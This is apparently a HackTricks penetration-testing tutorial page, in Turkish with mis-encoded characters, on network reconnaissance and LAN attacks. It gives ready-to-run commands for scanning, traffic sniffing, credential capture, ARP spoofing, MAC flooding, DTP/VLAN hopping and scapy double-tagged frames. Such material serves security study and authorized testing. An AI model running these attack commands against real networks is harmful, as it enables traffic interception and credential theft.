# Pentesting Network

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty ipucu**: **Intigriti'ye kaydolun**, **hackers tarafÄ±ndan, hackers iÃ§in oluÅŸturulmuÅŸ premium bir bug bounty platformu**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katÄ±lÄ±n ve **$100,000**'a kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

## DÄ±ÅŸarÄ±dan hostlarÄ± keÅŸfetmek

Bu, **Ä°nternetten yanÄ±t veren IP'leri bulmanÄ±n** **kÄ±sa bir bÃ¶lÃ¼mÃ¼** olacak.\
Bu durumda bazÄ± **IP kapsamlarÄ±nÄ±z** (belki birkaÃ§ **aralÄ±k**) var ve sadece **hangi IP'lerin yanÄ±t verdiÄŸini** bulmanÄ±z gerekiyor.

### ICMP

Bu, bir hostun aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± keÅŸfetmenin **en kolay** ve **en hÄ±zlÄ±** yoludur.\
BazÄ± **ICMP** paketleri gÃ¶ndermeyi deneyebilir ve **yanÄ±t bekleyebilirsiniz**. En kolay yol, sadece bir **echo request** gÃ¶ndermek ve yanÄ±tÄ± beklemektir. Bunu basit bir `ping` kullanarak veya **aralÄ±klar** iÃ§in `fping` kullanarak yapabilirsiniz.\
AyrÄ±ca, diÄŸer tÃ¼r ICMP paketleri gÃ¶ndermek iÃ§in **nmap** kullanabilirsiniz (bu, yaygÄ±n ICMP echo request-response filtrelerini atlatacaktÄ±r).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Her tÃ¼rlÃ¼ ICMP paketinin filtrelendiÄŸini bulmak Ã§ok yaygÄ±ndÄ±r. O zaman, bir hostun aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in yapabileceÄŸiniz tek ÅŸey **aÃ§Ä±k portlarÄ± bulmaya Ã§alÄ±ÅŸmaktÄ±r**. Her hostun **65535 portu** vardÄ±r, bu yÃ¼zden eÄŸer "bÃ¼yÃ¼k" bir kapsamÄ±nÄ±z varsa, her hostun **her portunun** aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± test edemezsiniz, bu Ã§ok fazla zaman alÄ±r.\
O zaman, ihtiyacÄ±nÄ±z olan ÅŸey **hÄ±zlÄ± bir port tarayÄ±cÄ±sÄ±** ([masscan](https://github.com/robertdavidgraham/masscan)) ve **en Ã§ok kullanÄ±lan portlarÄ±n** bir listesidir:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
`nmap` ile bu adÄ±mÄ± da gerÃ§ekleÅŸtirebilirsiniz, ancak daha yavaÅŸtÄ±r ve `nmap`'in aktif hostlarÄ± tanÄ±mlamada bazÄ± sorunlarÄ± vardÄ±r.

### HTTP Port KeÅŸfi

Bu, **HTTP** **hizmetlerini keÅŸfetmeye odaklanmak** istediÄŸinizde faydalÄ± olan bir TCP port keÅŸfidir:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

AyrÄ±ca, bir **host'a daha fazla dikkat etmeniz gerekip gerekmediÄŸini** belirlemek iÃ§in bazÄ± **UDP portlarÄ±nÄ±n aÃ§Ä±k** olup olmadÄ±ÄŸÄ±nÄ± kontrol etmeyi deneyebilirsiniz. UDP hizmetleri genellikle dÃ¼zenli bir boÅŸ UDP prob paketi ile **hiÃ§bir veri** ile **yanÄ±t vermediÄŸinden**, bir portun filtrelenip filtrelenmediÄŸini veya aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± sÃ¶ylemek zordur. Bunu belirlemenin en kolay yolu, Ã§alÄ±ÅŸan hizmetle ilgili bir paket gÃ¶ndermektir ve hangi hizmetin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± bilmediÄŸiniz iÃ§in, port numarasÄ±na dayalÄ± olarak en olasÄ± olanÄ± denemelisiniz:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Ã–nerilen nmap satÄ±rÄ±, **/24** aralÄ±ÄŸÄ±ndaki her hostta **en iyi 1000 UDP portunu** test edecektir, ancak bu bile **>20dk** sÃ¼recektir. **En hÄ±zlÄ± sonuÃ§lar** gerekiyorsa [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) kullanabilirsiniz: `./udp-proto-scanner.pl 199.66.11.53/24` Bu, bu **UDP probelerini** beklenen portlarÄ±na gÃ¶nderecektir (bir /24 aralÄ±ÄŸÄ± iÃ§in bu sadece 1 dk sÃ¼recektir): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port KeÅŸfi
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Burada yazÄ±ldÄ±ÄŸÄ± dÃ¶nemdeki tÃ¼m bilinen Wifi saldÄ±rÄ±larÄ±nÄ±n gÃ¼zel bir kÄ±lavuzunu bulabilirsiniz:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Ä°Ã§eriden hostlarÄ± keÅŸfetmek

AÄŸ iÃ§indeyseniz, yapmak isteyeceÄŸiniz ilk ÅŸeylerden biri **diÄŸer hostlarÄ± keÅŸfetmek** olacaktÄ±r. **Ne kadar gÃ¼rÃ¼ltÃ¼** yapabileceÄŸinize/istemediÄŸinize baÄŸlÄ± olarak, farklÄ± eylemler gerÃ§ekleÅŸtirilebilir:

### Pasif

BaÄŸlÄ± bir aÄŸ iÃ§indeki hostlarÄ± pasif olarak keÅŸfetmek iÃ§in bu araÃ§larÄ± kullanabilirsiniz:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktif

[_**DÄ±ÅŸarÄ±dan hostlarÄ± keÅŸfetme**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port KeÅŸfi_) bÃ¶lÃ¼mÃ¼nde bahsedilen tekniklerin burada da **uygulanabileceÄŸini** unutmayÄ±n.\
Ancak, diÄŸer hostlarla **aynÄ± aÄŸda** olduÄŸunuz iÃ§in **daha fazla ÅŸey** yapabilirsiniz:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

DÄ±ÅŸarÄ±dan hostlarÄ± keÅŸfetme ile ilgili yorumlanan tekniklerin (_Discovering hosts from the outside_ ([_**ICMP**_](./#icmp))) burada da **uygulanabileceÄŸini** unutmayÄ±n.\
Ancak, diÄŸer hostlarla **aynÄ± aÄŸda** olduÄŸunuz iÃ§in **daha fazla ÅŸey** yapabilirsiniz:

* EÄŸer bir **alt aÄŸ yayÄ±n adresine** **ping** atarsanÄ±z, ping **her hosta** ulaÅŸmalÄ± ve **size yanÄ±t verebilirler**: `ping -b 10.10.5.255`
* **AÄŸ yayÄ±n adresine** ping atarak **diÄŸer alt aÄŸlar** iÃ§indeki hostlarÄ± bile bulabilirsiniz: `ping -b 255.255.255.255`
* Host keÅŸfi yapmak iÃ§in `nmap`'in `-PE`, `-PP`, `-PM` bayraklarÄ±nÄ± kullanarak sÄ±rasÄ±yla **ICMPv4 echo**, **zaman damgasÄ±** ve **alt aÄŸ maskesi istekleri** gÃ¶nderin: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan, bilgisayarlarÄ± bir **aÄŸ mesajÄ±** aracÄ±lÄ±ÄŸÄ±yla **aÃ§mak iÃ§in** kullanÄ±lÄ±r. BilgisayarÄ± aÃ§mak iÃ§in kullanÄ±lan sihirli paket, yalnÄ±zca bir **MAC Dst** saÄŸlanan ve ardÄ±ndan aynÄ± paket iÃ§inde **16 kez tekrarlanan** bir pakettir.\
Bu tÃ¼r paketler genellikle **ethernet 0x0842** veya **port 9'a UDP paketi** olarak gÃ¶nderilir.\
EÄŸer **hiÃ§bir \[MAC]** saÄŸlanmazsa, paket **yayÄ±n ethernet**'e gÃ¶nderilir (ve yayÄ±n MAC, tekrarlanan MAC olacaktÄ±r).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Hedefleri Tarama

Derinlemesine taramak istediÄŸiniz tÃ¼m IP'leri (harici veya dahili) keÅŸfettikten sonra, farklÄ± eylemler gerÃ§ekleÅŸtirilebilir.

### TCP

* **AÃ§Ä±k** port: _SYN --> SYN/ACK --> RST_
* **KapalÄ±** port: _SYN --> RST/ACK_
* **FiltrelenmiÅŸ** port: _SYN --> \[YANIT YOK]_
* **FiltrelenmiÅŸ** port: _SYN --> ICMP mesajÄ±_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Bir UDP portunu taramak iÃ§in 2 seÃ§enek vardÄ±r:

* **KapalÄ±** ise bir **UDP paketi** gÃ¶nderin ve _**ICMP ulaÅŸÄ±lamaz**_ yanÄ±tÄ±nÄ± kontrol edin (birÃ§ok durumda ICMP **filtrelenebilir**, bu nedenle portun kapalÄ± mÄ± yoksa aÃ§Ä±k mÄ± olduÄŸuna dair herhangi bir bilgi almayacaksÄ±nÄ±z).
* Bir **hizmetten** (Ã¶rneÄŸin, DNS, DHCP, TFTP ve _nmap-payloads_ 'da listelenen diÄŸerleri) yanÄ±t almak iÃ§in **formatlanmÄ±ÅŸ datagramlar** gÃ¶nderin. EÄŸer bir **yanÄ±t** alÄ±rsanÄ±z, o zaman port **aÃ§Ä±ktÄ±r**.

**Nmap**, "-sV" kullanarak her iki seÃ§eneÄŸi de **karÄ±ÅŸtÄ±racaktÄ±r** (UDP taramalarÄ± Ã§ok yavaÅŸtÄ±r), ancak UDP taramalarÄ±nÄ±n TCP taramalarÄ±ndan daha yavaÅŸ olduÄŸunu unutmayÄ±n:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Tarama

**SCTP (AkÄ±ÅŸ Kontrol Ä°letim ProtokolÃ¼)**, **TCP (Ä°letim Kontrol ProtokolÃ¼)** ve **UDP (KullanÄ±cÄ± Datagram ProtokolÃ¼)** ile birlikte kullanÄ±lmak Ã¼zere tasarlanmÄ±ÅŸtÄ±r. Ana amacÄ±, IP aÄŸlarÄ± Ã¼zerinden telefon verilerinin taÅŸÄ±nmasÄ±nÄ± kolaylaÅŸtÄ±rmak ve **Signaling System 7 (SS7)**'de bulunan birÃ§ok gÃ¼venilirlik Ã¶zelliÄŸini yansÄ±tmaktÄ±r. **SCTP**, SS7 sinyallerini IP aÄŸlarÄ± Ã¼zerinden taÅŸÄ±mayÄ± amaÃ§layan **SIGTRAN** protokol ailesinin temel bir bileÅŸenidir.

**SCTP** desteÄŸi, **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** ve **VxWorks** gibi Ã§eÅŸitli iÅŸletim sistemleri tarafÄ±ndan saÄŸlanmaktadÄ±r; bu da telekomÃ¼nikasyon ve aÄŸ alanÄ±ndaki geniÅŸ kabulÃ¼nÃ¼ ve faydasÄ±nÄ± gÃ¶stermektedir.

nmap tarafÄ±ndan SCTP iÃ§in iki farklÄ± tarama sunulmaktadÄ±r: _-sY_ ve _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS ve IPS kaÃ§Ä±ÅŸÄ±

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Daha fazla nmap seÃ§eneÄŸi**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Dahili IP Adreslerini AÃ§Ä±ÄŸa Ã‡Ä±karma

**YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ yÃ¶nlendiriciler, gÃ¼venlik duvarlarÄ± ve aÄŸ cihazlarÄ±** bazen **kamusal olmayan kaynak adresleri** kullanarak aÄŸ sorgularÄ±na yanÄ±t verir. **tcpdump**, test sÄ±rasÄ±nda Ã¶zel adreslerden alÄ±nan paketleri tanÄ±mlamak iÃ§in kullanÄ±labilir. Ã–zellikle, Kali Linux'ta, kamu Internet'inden eriÅŸilebilen **eth2 arayÃ¼zÃ¼nde** paketler yakalanabilir. Kurulumunuzun bir NAT veya GÃ¼venlik DuvarÄ± arkasÄ±nda olduÄŸunu belirtmek Ã¶nemlidir; bu tÃ¼r paketlerin muhtemelen filtreleneceÄŸi dikkate alÄ±nmalÄ±dÄ±r.
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing ile yakalanan Ã§erÃ§eveleri ve paketleri inceleyerek IP aralÄ±klarÄ±, alt aÄŸ boyutlarÄ±, MAC adresleri ve ana bilgisayar adlarÄ± hakkÄ±nda ayrÄ±ntÄ±lar Ã¶ÄŸrenebilirsiniz. AÄŸ yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa veya anahtarlama yapÄ±sÄ± stres altÄ±ndaysa, saldÄ±rganlar pasif aÄŸ sniffing yoluyla hassas materyalleri yakalayabilir.

EÄŸer bir anahtarlÄ± Ethernet aÄŸÄ± dÃ¼zgÃ¼n yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, yalnÄ±zca yayÄ±n Ã§erÃ§evelerini ve MAC adresinize yÃ¶nelik materyalleri gÃ¶receksiniz.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Birisi, ayrÄ±ca, Wireshark'Ä± GUI olarak kullanarak bir SSH oturumu Ã¼zerinden uzaktaki bir makineden paketleri gerÃ§ek zamanlÄ± olarak yakalayabilir.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

AÃ§Ä±kÃ§a.

### Kimlik bilgilerini yakalama

Bir pcap veya canlÄ± bir arayÃ¼zden kimlik bilgilerini ayrÄ±ÅŸtÄ±rmak iÃ§in [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) gibi araÃ§lar kullanabilirsiniz.

## LAN saldÄ±rÄ±larÄ±

### ARP sahteciliÄŸi

ARP SahteciliÄŸi, bir makinenin IP'sinin cihazÄ±mÄ±zÄ±n MAC'ine sahip olduÄŸunu belirtmek iÃ§in gereksiz ARP YanÄ±tlarÄ± gÃ¶ndermeyi iÃ§erir. ArdÄ±ndan, kurban ARP tablosunu deÄŸiÅŸtirecek ve sahte IP ile iletiÅŸim kurmak istediÄŸinde her seferinde cihazÄ±mÄ±za baÅŸvuracaktÄ±r.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

AnahtarÄ±n CAM tablosunu farklÄ± kaynak MAC adresleriyle Ã§ok sayÄ±da paket gÃ¶ndererek taÅŸÄ±rÄ±n. CAM tablosu dolduÄŸunda, anahtar bir hub gibi davranmaya baÅŸlar (tÃ¼m trafiÄŸi yayar).
```bash
macof -i <interface>
```
Modern anahtarlar bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± dÃ¼zeltmiÅŸtir.

### 802.1Q VLAN / DTP SaldÄ±rÄ±larÄ±

#### Dinamik Trunking

**Dinamik Trunking ProtokolÃ¼ (DTP)**, trunking iÃ§in otomatik bir sistem saÄŸlamak amacÄ±yla bir baÄŸlantÄ± katmanÄ± protokolÃ¼ olarak tasarlanmÄ±ÅŸtÄ±r ve anahtarlarÄ±n trunk moduna (Trunk) veya non-trunk moduna otomatik olarak port seÃ§melerine olanak tanÄ±r. **DTP**'nin kullanÄ±mÄ± genellikle suboptimal aÄŸ tasarÄ±mÄ±nÄ±n bir gÃ¶stergesi olarak gÃ¶rÃ¼lÃ¼r ve trunk'larÄ±n yalnÄ±zca gerektiÄŸinde manuel olarak yapÄ±landÄ±rÄ±lmasÄ±nÄ±n ve uygun belgelerin saÄŸlanmasÄ±nÄ±n Ã¶nemini vurgular.

VarsayÄ±lan olarak, anahtar portlarÄ± Dinamik Otomatik modda Ã§alÄ±ÅŸacak ÅŸekilde ayarlanmÄ±ÅŸtÄ±r, bu da komÅŸu bir anahtar tarafÄ±ndan tetiklendiÄŸinde trunking baÅŸlatmaya hazÄ±r olduklarÄ± anlamÄ±na gelir. Bir pentester veya saldÄ±rgan anahtara baÄŸlandÄ±ÄŸÄ±nda ve bir DTP Ä°stenilen Ã§erÃ§evesi gÃ¶nderdiÄŸinde, bir gÃ¼venlik sorunu ortaya Ã§Ä±kar; bu, portun trunk moduna girmesine neden olur. Bu eylem, saldÄ±rgana STP Ã§erÃ§eve analizi yoluyla VLAN'larÄ± sayma ve sanal arayÃ¼zler kurarak VLAN segmentasyonunu aÅŸma imkanÄ± tanÄ±r.

BirÃ§ok anahtarda varsayÄ±lan olarak DTP'nin varlÄ±ÄŸÄ±, dÃ¼ÅŸmanlar tarafÄ±ndan bir anahtarÄ±n davranÄ±ÅŸÄ±nÄ± taklit etmek iÃ§in kullanÄ±labilir ve bÃ¶ylece tÃ¼m VLAN'lar Ã¼zerindeki trafiÄŸe eriÅŸim saÄŸlanabilir. [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) betiÄŸi, bir arayÃ¼zÃ¼ izlemek iÃ§in kullanÄ±lÄ±r ve bir anahtarÄ±n VarsayÄ±lan, Trunk, Dinamik, Otomatik veya EriÅŸim modunda olup olmadÄ±ÄŸÄ±nÄ± gÃ¶sterir; sonuncusu VLAN hopping saldÄ±rÄ±larÄ±na karÅŸÄ± tek korumasÄ±z yapÄ±landÄ±rmadÄ±r. Bu araÃ§, anahtarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± durumunu deÄŸerlendirir.

AÄŸ gÃ¼venlik aÃ§Ä±ÄŸÄ± tespit edilirse, _**Yersinia**_ aracÄ± DTP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla "trunking'i etkinleÅŸtirmek" iÃ§in kullanÄ±labilir ve bu da tÃ¼m VLAN'lardan paketlerin gÃ¶zlemlenmesine olanak tanÄ±r.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

VLAN'larÄ± listelemek iÃ§in [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** ile DTP Desirable Ã§erÃ§evesi oluÅŸturmak da mÃ¼mkÃ¼ndÃ¼r. **Scripti hiÃ§bir koÅŸulda durdurmayÄ±n. Her Ã¼Ã§ saniyede bir DTP Desirable enjekte eder. **Anahtardaki dinamik olarak oluÅŸturulan trunk kanallarÄ± yalnÄ±zca beÅŸ dakika boyunca canlÄ± kalÄ±r. BeÅŸ dakikadan sonra trunk dÃ¼ÅŸer.**
```
sudo python3 DTPHijacking.py --interface eth0
```
**Access/Desirable (0x03)**, DTP Ã§erÃ§evesinin Arzu edilen tÃ¼rde olduÄŸunu belirtir, bu da porta Trunk moduna geÃ§mesini sÃ¶yler. Ve **802.1Q/802.1Q (0xa5)**, **802.1Q** kapsama tÃ¼rÃ¼nÃ¼ belirtir.

STP Ã§erÃ§evelerini analiz ederek, **VLAN 30 ve VLAN 60'Ä±n varlÄ±ÄŸÄ±nÄ± Ã¶ÄŸreniyoruz.**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Belirli VLAN'lara SaldÄ±rma

VLAN ID'lerini ve IP deÄŸerlerini bildiÄŸinizde, **belirli bir VLAN'a saldÄ±rmak iÃ§in sanal bir arayÃ¼z yapÄ±landÄ±rabilirsiniz**.\
EÄŸer DHCP mevcut deÄŸilse, o zaman _ifconfig_ kullanarak statik bir IP adresi ayarlayÄ±n.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

TartÄ±ÅŸÄ±lan saldÄ±rÄ± olan **Dynamic Trunking ve sanal arayÃ¼zler oluÅŸturma ve diÄŸer VLAN'lar iÃ§indeki hostlarÄ± keÅŸfetme** iÅŸlemleri, araÃ§ tarafÄ±ndan **otomatik olarak gerÃ§ekleÅŸtirilir**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

EÄŸer bir saldÄ±rgan **kurban hostun MAC, IP ve VLAN ID deÄŸerlerini** biliyorsa, **Ã§erÃ§eveyi iki etiketle** kendi belirlenen VLAN'Ä± ve kurbanÄ±n VLAN'Ä±nÄ± kullanarak etiketlemeyi deneyebilir ve bir paket gÃ¶nderebilir. **Kurban geri baÄŸlanamayacaÄŸÄ± iÃ§in**, **saldÄ±rgan iÃ§in en iyi seÃ§enek, bazÄ± ilginÃ§ eylemler gerÃ§ekleÅŸtirebilen protokollerle (SNMP gibi) UDP Ã¼zerinden iletiÅŸim kurmaktÄ±r.**

SaldÄ±rgan iÃ§in bir diÄŸer seÃ§enek, **saldÄ±rgan tarafÄ±ndan kontrol edilen ve kurban tarafÄ±ndan eriÅŸilebilen bir IP'yi taklit ederek bir TCP port taramasÄ± baÅŸlatmaktÄ±r** (muhtemelen internet Ã¼zerinden). ArdÄ±ndan, saldÄ±rgan, kurbanÄ±n bazÄ± paketler alÄ±p almadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in kendisine ait ikinci hostta dinleme yapabilir.

![](<../../.gitbook/assets/image (190).png>)

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in scapy kullanabilirsiniz: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

EÄŸer **doÄŸrudan baÄŸlÄ± olduÄŸunuz bir anahtara eriÅŸiminiz varsa**, aÄŸ iÃ§inde **VLAN segmentasyonunu atlama** yeteneÄŸine sahip olursunuz. BasitÃ§e **portu trunk moduna geÃ§irin** (diÄŸer adÄ±yla trunk), hedef VLAN'larÄ±n kimlikleri ile sanal arayÃ¼zler oluÅŸturun ve bir IP adresi yapÄ±landÄ±rÄ±n. Adresi dinamik olarak (DHCP) talep etmeyi deneyebilirsiniz veya statik olarak yapÄ±landÄ±rabilirsiniz. Duruma baÄŸlÄ±dÄ±r.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

Belirli ortamlarda, misafir kablosuz aÄŸlar gibi, **port izolasyonu (Ã¶zel VLAN olarak da bilinir)** ayarlarÄ±, bir kablosuz eriÅŸim noktasÄ±na baÄŸlÄ± istemcilerin doÄŸrudan birbirleriyle iletiÅŸim kurmasÄ±nÄ± Ã¶nlemek iÃ§in uygulanÄ±r. Ancak, bu izolasyon Ã¶nlemlerini aÅŸabilen bir teknik tanÄ±mlanmÄ±ÅŸtÄ±r. Bu teknik, ya aÄŸ ACL'lerinin yokluÄŸundan ya da yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmasÄ±ndan yararlanarak, IP paketlerinin bir yÃ¶nlendirici Ã¼zerinden aynÄ± aÄŸdaki baÅŸka bir istemciye ulaÅŸmasÄ±nÄ± saÄŸlar.

